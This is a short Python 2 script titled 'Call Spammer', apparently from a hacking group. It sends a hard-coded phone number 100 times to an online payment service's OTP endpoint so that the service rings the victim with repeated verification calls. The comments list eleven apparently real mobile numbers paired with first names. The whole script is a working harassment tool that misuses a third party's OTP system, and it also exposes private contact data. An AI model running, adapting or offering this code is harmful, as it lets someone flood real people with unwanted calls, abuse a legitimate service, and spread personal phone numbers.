#!/usr/bin/python
#-*-coding:utf-8-*-
# Call Spammer
# Coded By Deray
# Github : https://github.com/LOoLzeC
# Instagram : reyy05_
####################
__banner__="""
************************************
* Call Spammer v.1
* Coded By : Deray
* Team : BlackHoleScurity
* Github : https://github.com/LOoLzeC
* Instagram : reyy05_
*************************************
"""
import sys,requests
import time
def callpam():
	print __banner__
	#082293922872 ogo
	#085145522224 mamta
	#082193284366 jimli
	#082371198369 arlin
	#082243309590 ashar
	#082247845551 eka
	#082285114495 sinta
	#082349266137 aldy
	#085344252529 rana
	#085341469911 puput
	#082293630813 hasbul
	
	
	phone= '082243309590'
	ulang= 100
	numb=int(ulang)
	param = {'msisdn':phone,'accept':'call'}
	count = 0
	while (numb > count):
                
		r = requests.post('https://www.tokocash.com/oauth/otp', data=param)
		if "otp_attempt_left" in r.text:
			print "[%s] send succes"%count
		else:
			print "[%s] send failed"%count
		count=count+1
		time.sleep(10)
if __name__ == "__main__":
        
	callpam()
